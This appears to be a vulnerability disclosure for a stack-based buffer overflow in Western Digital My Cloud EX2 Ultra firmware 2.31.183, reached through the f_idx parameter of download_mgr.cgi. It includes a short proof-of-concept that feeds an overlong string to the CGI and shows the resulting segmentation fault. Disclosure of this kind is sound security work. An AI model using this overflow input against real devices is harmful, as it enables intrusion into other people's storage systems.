> Western Digital
> My Cloud EX2 Ultra 2.31.183 allows web users (including guest account) to
> remotely execute arbitrary code via a stack-based buffer overflow. There is no
> size verification logic in one of functions in libscheddl.so, and
> download_mgr.cgi makes it possible to enter large-sized f_idx inputs.
>
> ------------------------------------------
>
> [Additional Information]
> root@MyCloudEX2Ultra cgi-bin # export REQUEST_METHOD=GET
> root@MyCloudEX2Ultra cgi-bin # export QUERY_STRING=cmd=Downloads_Schedule_Info\&f_idx=`python -c 'print "a"*0x1f3 + "bbbb"'`
> root@MyCloudEX2Ultra cgi-bin # ./download_mgr.cgi
> I/O warning : failed to load external entity "/mnt/HD_a4/.systemfile/schedcfgs/aaaaaa (etc.) aaaaabbbb.xml"
> Segmentation fault
>
> ------------------------------------------
>
> [Vulnerability Type]
> Buffer Overflow
>
> ------------------------------------------
>
> [Vendor of Product]
> Western Digital
>
> ------------------------------------------
>
> [Affected Product Code Base]
> WD My Cloud EX2 Ultra - 2.31.183
>
> ------------------------------------------
>
> [Affected Component]
> libscheddl.so, download_mgr.cgi
>
> ------------------------------------------
>
> [Attack Type]
> Remote
>
> ------------------------------------------
>
> [Impact Code execution]
> true
>
> ------------------------------------------
>
> [Attack Vectors]
> To execute arbitrary code, web users enter the vulnerable cgi file with malicious parameters.
>
> ------------------------------------------
>
> [Has vendor confirmed or acknowledged the vulnerability?]
> true
>
> ------------------------------------------
>
> [Discoverer]
> DelspoN & Jeong Jae Young
>
> ------------------------------------------
>
> [Reference]
> https://support.wdc.com/downloads.aspx?g=907&lang=en